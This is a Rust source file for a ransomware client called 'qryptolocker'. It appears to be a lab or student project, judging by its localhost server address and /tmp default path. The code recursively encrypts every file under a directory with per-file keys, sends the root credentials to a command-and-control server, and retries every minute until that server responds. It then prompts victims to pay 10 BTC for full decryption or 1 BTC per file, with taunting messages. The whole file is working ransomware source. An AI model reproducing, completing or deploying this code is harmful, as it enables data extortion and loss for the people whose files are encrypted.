use crate::crypto::SecureClient;
use crate::metatable::{DirMetadata, FileMetadata, MetaTable, MetaTableContent};
use anyhow::Result;
use argon2::{Algorithm, Argon2, Params, Version, password_hash::rand_core::OsRng};
use chacha20poly1305::aead::Aead;
use chacha20poly1305::{AeadCore, Key, KeyInit, XChaCha20Poly1305, XNonce};
use crypto::common::rand_core::RngCore;
use flate2::read::GzDecoder;
use hkdf::Hkdf;
use hmac::{Hmac, Mac};
use inquire::{Confirm, Password, Text};
use log::{debug, error, info};
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use sha3::Sha3_256;
use shared::{
    EncryptedRequest, EncryptedResponse, FullDecryptCredentials, GetFileWordRequest,
    GetFileWordResponse, RegisterClientRequest, RegisterClientResponse, RetrieveKeyRequest,
    UpdateCredentialsRequest, UpdateCredentialsResponse,
};
use std::fs::{self};
use std::io::{BufReader, BufWriter, Read, Write};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use zeroize::{Zeroize, ZeroizeOnDrop, Zeroizing};

type HmacSha3 = Hmac<Sha3_256>;

const WORDLIST_COMPRESSED: &[u8] = include_bytes!("../../../data/words_compressed.tar.gz");

static DICTIONARY: Lazy<Vec<String>> = Lazy::new(|| {
    let mut decoder = GzDecoder::new(WORDLIST_COMPRESSED);
    let mut decompressed = String::new();

    decoder
        .read_to_string(&mut decompressed)
        .expect("Failed to decompress wordlist");

    decompressed.lines().map(String::from).collect()
});

/// Unique pour tous les mots, envoyé au serveur et zeroed dans le runtime
///
/// - wrapped_key: clé symétrique wrapped avec le mot du root dir
/// - key_nonce: nonce utilisé pour wrap la clé symétrique
/// - salt_word_gen: Sel utilisé pour la génération des mots
#[derive(Zeroize, ZeroizeOnDrop)]
pub struct Client {
    #[zeroize(skip)]
    wrapped_key: Vec<u8>,

    key_wrapper_salt: Option<[u8; 16]>,

    #[zeroize(skip)]
    key_nonce: XNonce,

    root_word: Option<String>,

    salt_word_global: Option<[u8; 16]>,

    #[zeroize(skip)]
    root_path: PathBuf,

    #[zeroize(skip)]
    net_client: SecureClient,

    #[zeroize(skip)]
    client_id: Arc<Mutex<Option<String>>>,
}

impl Default for Client {
    fn default() -> Self {
        Self::new(Path::new("/tmp/test_dir/"), Self::gen_salt())
    }
}

impl Client {
    pub fn new(root_path: &Path, words_salt: [u8; 16]) -> Self {
        debug!("[INIT] Initializing new client");
        let mut root_key = XChaCha20Poly1305::generate_key(&mut OsRng);
        let root_nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);

        // Generate word and wrap root_key with it
        let word = Self::gen_root_password().expect("Failed to generate root password");
        let wrapper_salt = Self::gen_salt();
        let mut wrapper_key = match Self::derive_word(&word, &wrapper_salt) {
            Ok(key) => key,
            Err(e) => {
                error!("[INIT] Error deriving the key: {}", e);
                panic!()
            }
        };
        let cipher = XChaCha20Poly1305::new(&wrapper_key);
        wrapper_key.as_mut_slice().zeroize();
        let wrapped_key = cipher
            .encrypt(&root_nonce, root_key.as_ref())
            .map_err(|e| anyhow::anyhow!("Encryption failed: {}", e))
            .unwrap();
        root_key.as_mut_slice().zeroize();

        // Initialize last needed variables
        let path = root_path.to_path_buf();
        let net_client = SecureClient::new().expect("Failed to init secure client");
        debug!("[INIT] New client initialized");

        Client {
            wrapped_key,
            key_nonce: root_nonce,
            salt_word_global: Some(words_salt),
            root_word: Some(word),
            key_wrapper_salt: Some(wrapper_salt),
            root_path: path,
            net_client,
            client_id: Arc::new(Mutex::new(None)),
        }
    }

    // ============================================================================
    // Utils
    // ============================================================================

    fn compute_metatable_mac(content: &MetaTableContent, dir_key: &Key) -> Result<[u8; 32]> {
        let content_bytes = serde_json::to_vec(content)
            .map_err(|e| anyhow::anyhow!("Failed to serialize content for MAC: {}", e))?;

        let mut mac = <HmacSha3 as Mac>::new_from_slice(dir_key.as_slice())
            .map_err(|e| anyhow::anyhow!("Failed to create HMAC: {}", e))?;

        mac.update(&content_bytes);

        let result = mac.finalize();
        let bytes: [u8; 32] = result.into_bytes().into();

        Ok(bytes)
    }

    fn verify_metatable_mac(metatable: &MetaTable, dir_key: &Key) -> Result<()> {
        let content_bytes = serde_json::to_vec(&metatable.content).map_err(|e| {
            anyhow::anyhow!("Failed to serialize content for MAC verification: {}", e)
        })?;

        let mut mac = <HmacSha3 as Mac>::new_from_slice(dir_key.as_slice())
            .map_err(|e| anyhow::anyhow!("Failed to create HMAC: {}", e))?;

        mac.update(&content_bytes);

        mac.verify_slice(&metatable.mac)
            .map_err(|_| anyhow::anyhow!("Metatable integrity check failed - MAC mismatch"))?;

        Ok(())
    }

    fn ensure_root_credentials(&mut self) -> Result<()> {
        if self.root_word.is_none() || self.key_wrapper_salt.is_none() {
            let creds = Zeroizing::new(self.retrieve_root_creds()?);
            self.root_word = Some(creds.root_word.clone());
            self.key_wrapper_salt = Some(creds.key_wrapper_salt);
        }

        Ok(())
    }

    fn verify_credentials_proof(creds: &FullDecryptCredentials) -> Result<()> {
        let mut wrapper_key = Self::derive_word(&creds.root_word, &creds.key_wrapper_salt)?;

        // Extract nonce (first 24 bytes) and ciphertext (rest)
        if creds.proof_ciphertext.len() < 24 {
            return Err(anyhow::anyhow!("Invalid proof ciphertext length"));
        }

        let (nonce_bytes, ciphertext) = creds.proof_ciphertext.split_at(24);
        let nonce = XNonce::from_slice(nonce_bytes);

        // Decrypt proof
        let cipher = XChaCha20Poly1305::new(&wrapper_key);
        wrapper_key.as_mut_slice().zeroize();

        let decrypted = cipher.decrypt(nonce, ciphertext).map_err(|_| {
            anyhow::anyhow!("Credential proof verification failed - invalid credentials")
        })?;

        // Compare with expected plaintext
        if decrypted.as_slice() != creds.proof_plaintext {
            return Err(anyhow::anyhow!(
                "Credential proof mismatch - server sent invalid credentials"
            ));
        }

        Ok(())
    }

    fn read_content(path: &Path) -> Result<Vec<u8>, std::io::Error> {
        let file = fs::File::open(path)?;
        let mut reader = BufReader::new(file);
        let mut plaintext = Vec::new();
        reader.read_to_end(&mut plaintext)?;

        Ok(plaintext)
    }

    fn write_content(path: &Path, buf: &[u8]) -> Result<(), std::io::Error> {
        let file = fs::File::create(path)?;
        let mut writer = BufWriter::new(file);
        writer.write_all(buf)?;
        writer.flush()?;

        Ok(())
    }

    /// Deterministic word based on the hash of the path it's related to.
    /// - `path`: Path of the file the word represents.
    fn gen_word(&self, path: &Path) -> Result<String> {
        let dict = &*DICTIONARY;
        let path_str = path.to_string_lossy().to_string();

        //If salt_word_global not set (None), retrieve from server
        if self.salt_word_global.is_none() {
            let cid = self.client_id.lock().unwrap();
            let cid = cid
                .as_ref()
                .ok_or_else(|| anyhow::anyhow!("Client ID not set. Cannot retrieve file word"))?
                .clone();
            let req = GetFileWordRequest {
                file_path: path_str.clone(),
                client_id: cid,
            };

            let resp: GetFileWordResponse = self.send_request("/client/decrypt_file", &req)?;

            return Ok(resp.word);
        }

        // else that means we're not done with encryption, so we can retrieve it from self
        let salt = Zeroizing::new(self.salt_word_global.unwrap());

        // Arithmetic encoding
        let hk = Hkdf::<Sha3_256>::new(Some(b"qrypto-word-derivation"), salt.as_ref());
        let mut index_bytes = [0u8; 8];
        hk.expand(path_str.as_bytes(), &mut index_bytes)
            .map_err(|_| anyhow::anyhow!("HKDF expand failed"))?;

        let mut hash_value = u64::from_le_bytes(index_bytes);

        let index = (hash_value % dict.len() as u64) as usize;
        hash_value.zeroize();

        // Pick word
        let word = dict[index].clone();

        Ok(word)
    }

    ///Generates a non-deterministic word used to wrap the main sym key
    fn gen_root_password() -> Result<String> {
        let dict = &*DICTIONARY;
        let mut rand_bytes = [0u8; 8];

        OsRng.fill_bytes(&mut rand_bytes);
        let index_bytes = u64::from_le_bytes(rand_bytes);
        rand_bytes.zeroize();

        let index = (index_bytes % dict.len() as u64) as usize;
        Ok(dict[index].clone().to_string())
    }

    fn gen_salt() -> [u8; 16] {
        let mut salt = [0u8; 16];
        OsRng.fill_bytes(&mut salt);
        salt
    }

    /// Transforms a word into a crypto secure key
    fn derive_word(word: &String, salt: &[u8]) -> Result<Key> {
        let params = Params::new(65536, 3, 1, Some(32))
            .map_err(|e| anyhow::anyhow!("Failed to build Argon2 params: {}", e))?;
        let alg = Argon2::new(Algorithm::Argon2id, Version::V0x13, params);

        let mut key_bytes = [0u8; 32];

        alg.hash_password_into(word.as_bytes(), salt, &mut key_bytes)
            .map_err(|e| anyhow::anyhow!("Failed to hash password: {:?}", e))?;

        Ok(Key::from(key_bytes))
    }

    fn unwrap_root_key(&self) -> Result<Key> {
        //Check if root_word is set before unwrapping, if not, get it from server
        let key_wrapper_salt = self
            .key_wrapper_salt
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("Key Wrapper Salt not set"))?;
        let root_word = self
            .root_word
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("Root word not set"))?;
        let mut wrapper_key = Self::derive_word(root_word, key_wrapper_salt)?;

        let cipher = XChaCha20Poly1305::new(&wrapper_key);
        wrapper_key.as_mut_slice().zeroize();

        let root_key_bytes = cipher
            .decrypt(&self.key_nonce, self.wrapped_key.as_ref())
            .map_err(|e| anyhow::anyhow!("Failed to unwrap root key: {}", e))?;

        let root_key_array: [u8; 32] = root_key_bytes
            .try_into()
            .map_err(|_| anyhow::anyhow!("Invalid key length"))?;

        Ok(Key::from(root_key_array))
    }

    fn save_dir_metadata(
        &self,
        dir_path: &Path,
        content: &MetaTableContent,
        dir_key: &Key,
    ) -> Result<()> {
        let mac = Self::compute_metatable_mac(content, dir_key)?;
        let metatable = MetaTable {
            content: content.clone(),
            mac,
        };

        let json_bytes = serde_json::to_vec_pretty(&metatable)
            .map_err(|e| anyhow::anyhow!("Failed to serialize metadata: {}", e))?;

        let meta_file = dir_path.join(".qryptolocker_meta");
        Self::write_content(&meta_file, &json_bytes)?;

        Ok(())
    }

    fn update_server_credentials(
        &self,
        new_root_word: &str,
        new_key_wrapper_salt: &[u8; 16],
    ) -> Result<()> {
        let cid = self.client_id.lock().unwrap();
        let cid = cid
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("Client ID not set. Cannot update credentials"))?
            .clone();

        let req = UpdateCredentialsRequest {
            client_id: cid,
            new_root_word: new_root_word.to_string(),
            new_key_wrapper_salt: *new_key_wrapper_salt,
        };

        let resp: UpdateCredentialsResponse =
            self.send_request("/client/update_credentials", &req)?;

        if resp.success {
            Ok(())
        } else {
            Err(anyhow::anyhow!("Failed to update server credentials"))
        }
    }

    fn load_metatable(&self, dir_path: &Path, dir_key: &Key) -> Result<MetaTableContent> {
        let meta_file = dir_path.join(".qryptolocker_meta");
        let json_bytes = Self::read_content(&meta_file)?;

        let metatable: MetaTable = serde_json::from_slice(&json_bytes)
            .map_err(|e| anyhow::anyhow!("Failed to deserialize metadata: {}", e))?;

        Self::verify_metatable_mac(&metatable, dir_key)?;

        Ok(metatable.content)
    }

    fn load_metatable_unverified(&self, dir_path: &Path) -> Result<MetaTableContent> {
        let meta_file = dir_path.join(".qryptolocker_meta");
        let json_bytes = Self::read_content(&meta_file)?;

        let metatable: MetaTable = serde_json::from_slice(&json_bytes)
            .map_err(|e| anyhow::anyhow!("Failed to deserialize metadata: {}", e))?;

        Ok(metatable.content)
    }

    fn retrieve_root_creds(&self) -> Result<FullDecryptCredentials> {
        let cid = self.client_id.lock().unwrap();
        let cid = cid
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("Client ID not set. Cannot retrieve keys"))?;

        let req = RetrieveKeyRequest {
            client_id: cid.clone(),
        };

        let creds: FullDecryptCredentials = self.send_request("/client/decrypt_full", &req)?;

        Ok(creds)
    }

    fn send_request<Req: Serialize, Res: for<'a> Deserialize<'a> + Serialize>(
        &self,
        path: &str,
        body: &Req,
    ) -> Result<Res> {
        let client = reqwest::blocking::Client::new();
        let url = format!("http://0.0.0.0:8000{}", path);

        let (enc_req, mut shared_secret) = self.net_client.encrypt_request(body)?;

        let response = client.post(url).json(&enc_req).send()?.error_for_status()?;

        let enc_resp: EncryptedResponse = response.json()?;

        let decoded = self.net_client.decrypt_response(enc_resp, shared_secret)?;
        shared_secret.zeroize();
        Ok(decoded)
    }

    fn register(&mut self) -> Result<()> {
        let root_word = self
            .root_word
            .clone()
            .ok_or_else(|| anyhow::anyhow!("Root word not set"))?;

        // Build and encrypt request
        let mut req = RegisterClientRequest {
            root_word,
            key_wrapper_salt: self
                .key_wrapper_salt
                .expect("Key Wrapper Salt is not set. Cannot register client"),
            salt_word_global: self
                .salt_word_global
                .expect("Salt Word Global is not set. Cannot register client"),
        };
        let (enc_req, mut shared_secret) = self.net_client.encrypt_request(&req)?;
        req.zeroize();

        // Try directly sending the request
        if let Ok(cid) = self.try_send_encrypted_register(&enc_req, shared_secret) {
            *self.client_id.lock().unwrap() = Some(cid);
            return Ok(());
        };

        // If server not available yet, spawn a thread and indefinitely try to contact it
        let srv_url = "http://0.0.0.0:8000";
        let client_id = self.client_id.clone();
        thread::spawn(move || {
            let net_client = SecureClient::new().expect("Couldn't create Secure Client, sorry.");
            let client = reqwest::blocking::Client::builder()
                .timeout(Duration::from_secs(30))
                .build()
                .unwrap();
            let url = format!("{}/client/register", srv_url);

            loop {
                if let Ok(resp) = client.post(&url).json(&enc_req).send()
                    && resp.status().is_success()
                    && let Ok(enc_resp) = resp.json::<EncryptedResponse>()
                    && let Ok(reg_resp) = net_client
                        .decrypt_response::<RegisterClientResponse>(enc_resp, shared_secret)
                {
                    *client_id.lock().unwrap() = Some(reg_resp.client_id.to_string());
                    return;
                }

                thread::sleep(Duration::from_secs(60));
            }
        });

        shared_secret.zeroize();

        Ok(())
    }

    fn try_send_encrypted_register(
        &self,
        enc_req: &EncryptedRequest,
        shared_secret: [u8; 32],
    ) -> Result<String> {
        let client = reqwest::blocking::Client::new();
        let url = "http://0.0.0.0:8000/client/register".to_string();

        let response = client.post(&url).json(enc_req).send()?.error_for_status()?;
        let enc_resp: EncryptedResponse = response.json()?;
        let resp: RegisterClientResponse =
            self.net_client.decrypt_response(enc_resp, shared_secret)?;

        Ok(resp.client_id.to_string())
    }

    // ============================================================================
    // Encryption
    // ============================================================================

    /// Encrypts recursively from the `root_path`
    pub fn encrypt(&mut self) -> Result<()> {
        let root_path = self.root_path.clone();
        let mut root_key = self.unwrap_root_key()?;

        self.encrypt_dir(&root_path, &root_key)?;

        self.register()?;

        root_key.as_mut_slice().zeroize();
        self.zeroize();

        Ok(())
    }

    /// Processes the directories in the encryption recursion
    fn encrypt_dir(&mut self, dir_path: &Path, parent_key: &Key) -> Result<()> {
        let mut content = MetaTableContent {
            files: Vec::new(),
            subdirs: Vec::new(),
        };

        for entry in std::fs::read_dir(dir_path)? {
            let entry = entry?;
            let path = entry.path();

            if path.file_name() == Some(std::ffi::OsStr::new(".qryptolocker_meta")) {
                continue;
            }

            if path.is_dir() {
                let mut subdir_word = Zeroizing::new(self.gen_word(&path)?);

                let subdir_key_salt = Self::gen_salt();
                let mut subdir_key = Self::derive_word(&subdir_word, &subdir_key_salt)?;

                let word_enc_nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
                let cipher = XChaCha20Poly1305::new(parent_key);
                let enc_word = cipher
                    .encrypt(&word_enc_nonce, subdir_word.as_bytes())
                    .map_err(|e| anyhow::anyhow!("Failed to encrypt subdir word: {}", e))?;
                subdir_word.zeroize();

                content.subdirs.push(DirMetadata {
                    path: path.clone(),
                    enc_word,
                    word_enc_nonce: word_enc_nonce.into(),
                    dir_key_salt: subdir_key_salt,
                });

                self.encrypt_dir(&path, &subdir_key)?;
                subdir_key.as_mut_slice().zeroize();
            } else if path.is_file() {
                let file_word = Zeroizing::new(self.gen_word(&path)?);
                let file_salt = Self::gen_salt();
                let mut file_key = Self::derive_word(&file_word, &file_salt)?;

                let word_enc_nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
                let cipher = XChaCha20Poly1305::new(parent_key);
                let enc_word = cipher
                    .encrypt(&word_enc_nonce, file_word.as_bytes())
                    .map_err(|e| anyhow::anyhow!("Failed to encrypt file word: {}", e))?;

                let file_metadata = self.encrypt_file(
                    &path,
                    &file_key,
                    enc_word,
                    word_enc_nonce.into(),
                    file_salt,
                )?;
                file_key.as_mut_slice().zeroize();
                content.files.push(file_metadata);
            }
        }

        self.save_dir_metadata(dir_path, &content, parent_key)?;

        Ok(())
    }

    /// Processes the files in the encryption recursion
    ///
    /// - `path`: path of the file to encrypt
    /// - `file_key`: key derived from the file's word
    /// - `enc_word`: encrypted file's word
    /// - `word_enc_nonce`: nonce used to encrypt the word
    /// - `file_salt`: salt used to derive the file's word
    fn encrypt_file(
        &self,
        path: &Path,
        file_key: &Key,
        enc_word: Vec<u8>,
        word_enc_nonce: [u8; 24],
        file_salt: [u8; 16],
    ) -> Result<FileMetadata> {
        let mut pt = Self::read_content(path)?;

        let file_nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
        let cipher = XChaCha20Poly1305::new(file_key);

        let ct = cipher
            .encrypt(&file_nonce, pt.as_ref())
            .map_err(|e| anyhow::anyhow!("File encryption failed: {}", e))?;
        pt.zeroize();

        Self::write_content(path, &ct)?;

        Ok(FileMetadata {
            path: path.to_path_buf(),
            enc_word,
            word_enc_nonce,
            file_nonce: file_nonce.into(),
            file_salt,
        })
    }

    // ============================================================================
    // Decryption
    // ============================================================================

    pub fn pay(&mut self) -> Result<()> {
        let choice = Confirm::new(
            "Are you willing to pay to decrypt the entirety of your directory (10 BTC) ?",
        )
        .with_default(false)
        .prompt()?;

        let mut creds: FullDecryptCredentials;

        match choice {
            true => {
                creds = self.retrieve_root_creds()?;

                Self::verify_credentials_proof(&creds)?;

                println!("Ok that's fine, here's your password: {}", creds.root_word);
                loop {
                    let password = Password::new("Enter the received password")
                        .without_confirmation()
                        .prompt()?;

                    let source_pwd = creds.root_word.clone();
                    if password == source_pwd {
                        self.decrypt_full(&creds)?;
                        creds.zeroize();
                        break;
                    } else {
                        println!(
                            "Come on... I've made it simple enough for you to input... try again!"
                        );
                    }
                }
            }
            false => {
                println!("You're right, these files aren't important after all...");
            }
        };

        Ok(())
    }

    /// Decrypts only one file in the arborescence
    pub fn unlock_one(&mut self) -> Result<()> {
        let res = Confirm::new("Are you willing to pay 1 BTC to decrypt one file ?")
            .with_default(false)
            .prompt()?;

        let path_str = match res {
            true => Text::new("Enter the full path of the file you want to decrypt").prompt()?,
            false => {
                println!("Well too bad, come back if you change your mind");
                return Ok(());
            }
        };

        let file_path = Path::new(path_str.as_str());

        info!("[DEC] Decrypting file: {:?}", file_path);

        let parent_dir = file_path
            .parent()
            .ok_or_else(|| anyhow::anyhow!("File has no parent directory"))?;

        //If parent is root, retrieve root key
        let mut parent_key = if parent_dir == self.root_path {
            self.ensure_root_credentials()?;
            self.unwrap_root_key()?
        } else {
            // Else get dir key from grandparent dir
            let grandparent_dir = parent_dir
                .parent()
                .ok_or_else(|| anyhow::anyhow!("Parent has no parent"))?;

            let grandparent_content = self.load_metatable_unverified(grandparent_dir)?;

            let parent_meta = grandparent_content
                .subdirs
                .iter()
                .find(|d| d.path == parent_dir)
                .ok_or_else(|| {
                    anyhow::anyhow!("Parent directory not found in grandparent metadata")
                })?;

            let mut parent_word = self.gen_word(parent_dir)?;

            let res = Self::derive_word(&parent_word, &parent_meta.dir_key_salt)?;
            parent_word.zeroize();

            res
        };

        // Decrypt the file word
        let parent_metatable = self.load_metatable(parent_dir, &parent_key)?;

        let file_meta = parent_metatable
            .files
            .iter()
            .find(|f| f.path == file_path)
            .ok_or_else(|| anyhow::anyhow!("File not found in metadata"))?;

        let cipher = XChaCha20Poly1305::new(&parent_key);
        parent_key.as_mut_slice().zeroize();

        let word_nonce = XNonce::from_slice(&file_meta.word_enc_nonce);
        let file_word_bytes = cipher
            .decrypt(word_nonce, file_meta.enc_word.as_ref())
            .map_err(|e| anyhow::anyhow!("Failed to decrypt file word: {}", e))?;
        let mut file_word = String::from_utf8(file_word_bytes)?;

        info!("Here's the password for your specific file: {}", file_word);
        loop {
            let password = Password::new("Enter the received password")
                .without_confirmation()
                .prompt()?;

            if password == file_word {
                self.decrypt_file(file_meta, &file_word)?;
                file_word.zeroize();
                break;
            } else {
                info!("Come on... I've made it simple enough for you to input... try again!");
            }
        }

        info!("[DEC] Successfully decrypted: {:?}", file_path);
        Ok(())
    }

    /// Déchiffre toute l'arboresence
    pub fn decrypt_full(&mut self, creds: &FullDecryptCredentials) -> Result<()> {
        info!("[DEC] Decrypting whole arboresence...");
        let root = self.root_path.clone();

        self.root_word = Some(creds.root_word.clone());
        self.key_wrapper_salt = Some(creds.key_wrapper_salt);

        // Load the first metatable
        let mut root_key = self.unwrap_root_key()?;

        self.decrypt_dir(&root, &root_key)?;
        root_key.as_mut_slice().zeroize();
        self.zeroize();

        info!("[DEC] Decrypted whole arborescence.");

        Ok(())
    }

    /// Recursive decryption of the subdirectories
    ///
    /// - `dir_path`: Path of the directory to process
    /// - `dir_key`: Key derived from the directory's word, stored in the parent directory
    /// - `metatable`: Metadata table of the processed directory
    fn decrypt_dir(&self, dir_path: &Path, dir_key: &Key) -> Result<()> {
        info!("[DEC-DIR] Decrypting: {:?}", dir_path);

        let content = self.load_metatable(dir_path, dir_key)?;

        for file_meta in &content.files {
            // Decrypt file word
            let cipher = XChaCha20Poly1305::new(dir_key);
            let word_nonce = XNonce::from_slice(&file_meta.word_enc_nonce);
            let file_word_bytes = cipher
                .decrypt(word_nonce, file_meta.enc_word.as_ref())
                .map_err(|e| anyhow::anyhow!("Failed to decrypt file word: {}", e))?;

            let mut file_word = String::from_utf8(file_word_bytes)?;
            self.decrypt_file(file_meta, &file_word)?;
            file_word.zeroize();
        }

        for subdir_meta in &content.subdirs {
            // Decrypt subdir word
            let cipher = XChaCha20Poly1305::new(dir_key);
            let word_nonce = XNonce::from_slice(&subdir_meta.word_enc_nonce);
            let subdir_word_bytes = cipher
                .decrypt(word_nonce, subdir_meta.enc_word.as_ref())
                .map_err(|e| anyhow::anyhow!("Failed to decrypt subdir word: {}", e))?;

            let mut subdir_word = String::from_utf8(subdir_word_bytes)?;

            let mut subdir_key = Self::derive_word(&subdir_word, &subdir_meta.dir_key_salt)?;
            subdir_word.zeroize();

            self.decrypt_dir(&subdir_meta.path, &subdir_key)?;
            subdir_key.as_mut_slice().zeroize();
        }

        //Clean up metatables
        let meta_file = dir_path.join(".qryptolocker_meta");
        std::fs::remove_file(&meta_file).map_err(|e| {
            anyhow::anyhow!(
                "[DEC-DIR] Failed to remove metatable {:?}: {}",
                meta_file,
                e
            )
        })?;

        Ok(())
    }

    /// Decrypts file in the recursive decryption process
    ///
    /// - `file_meta`: File metadata entry
    /// - `file_word`: Decrypted word used to decrypt the file
    fn decrypt_file(&self, file_meta: &FileMetadata, file_word: &str) -> Result<()> {
        info!("[DEC-FILE] Decrypting {:?}", file_meta.path);

        let mut ct = Self::read_content(&file_meta.path)?;
        let mut key = Self::derive_word(&file_word.to_string(), &file_meta.file_salt)?;

        let cipher = XChaCha20Poly1305::new(&key);
        key.zeroize();
        match cipher.decrypt(&file_meta.file_nonce.into(), ct.as_ref()) {
            Ok(pt) => {
                Self::write_content(&file_meta.path, &pt)?;
                info!("[DEC-FILE] Successfuly decrypted: {:?}", file_meta.path);
                ct.zeroize();
                Ok(())
            }
            Err(e) => {
                error!(
                    "[DEC-FILE] Decryption failed (already decrypted ?): {:?} - Error: {}",
                    file_meta.path, e
                );
                ct.zeroize();
                Ok(())
            }
        }
    }

    // ============================================================================
    // Root key re-wrapping
    // ============================================================================

    /// Modifies the root password
    pub fn change_pwd(&mut self) -> Result<()> {
        self.ensure_root_credentials()?;

        let mut root_key = self.unwrap_root_key()?;

        let mut new_root_pwd = Self::gen_root_password()?;

        let mut new_wrapper_salt = Self::gen_salt();
        let mut new_wrapper_key = Self::derive_word(&new_root_pwd, &new_wrapper_salt)?;

        let new_nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);

        let cipher = XChaCha20Poly1305::new(&new_wrapper_key);
        new_wrapper_key.as_mut_slice().zeroize();

        let new_wrapped_key = cipher
            .encrypt(&new_nonce, root_key.as_ref())
            .map_err(|e| anyhow::anyhow!("Failed to re-wrap key: {}", e))?;
        root_key.as_mut_slice().zeroize();

        self.wrapped_key = new_wrapped_key;
        self.key_nonce = new_nonce;

        self.update_server_credentials(&new_root_pwd, &new_wrapper_salt)?;
        new_root_pwd.zeroize();
        new_wrapper_salt.zeroize();

        Ok(())
    }
}
